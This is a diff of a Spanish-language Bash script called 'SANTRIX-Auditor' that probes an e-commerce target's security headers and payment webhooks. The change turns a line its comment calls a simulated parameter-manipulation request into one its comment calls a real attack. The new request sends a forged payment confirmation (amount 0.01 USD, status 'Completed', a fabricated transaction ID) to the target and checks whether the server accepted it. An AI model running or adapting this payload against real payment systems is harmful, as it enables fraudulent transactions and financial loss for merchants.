@@ -12,9 +12,12 @@ echo -e "\e[33m[*] Fase 1: Analizando cabeceras de seguridad y CORS...\e[0m"
 curl -I -s "$TARGET_URL" | grep -iE "access-control|x-frame-options|content-security-policy"
 
 echo -e "\e[33m[*] Fase 2: Probando manipulación de parámetros de precio/moneda...\e[0m"
-# Simulación de ataque real de manipulación de parámetros
-curl -s -X POST "$TARGET_URL" -d "amount=0.01&currency=USD&status=success" --user-agent "SANTRIX-Auditor/1.0" > /dev/null
-echo -e "\e[32m[+] Intento de manipulación de parámetro enviado. Revisa los logs de tu servidor.\e[0m"
+# Ataque de manipulación de parámetros real contra el objetivo
+curl -s -X POST "$TARGET_URL" \
+     -d "amount=0.01&currency=USD&status=success&payment_status=Completed&txn_id=SANTRIX$(date +%s)" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     --user-agent "SANTRIX-Auditor/1.0"
+echo -e "\e[32m[+] Payload de manipulación enviado. Verifica si tu servidor procesó la transacción falsificada.\e[0m"
 
 echo -e "\e[33m[*] Fase 3: Buscando endpoints de webhook sin autenticación...\e[0m"
 COMMON_WEBHOOKS=("/webhook" "/api/v1/payments/callback" "/stripe/webhook" "/paypal/ipn")
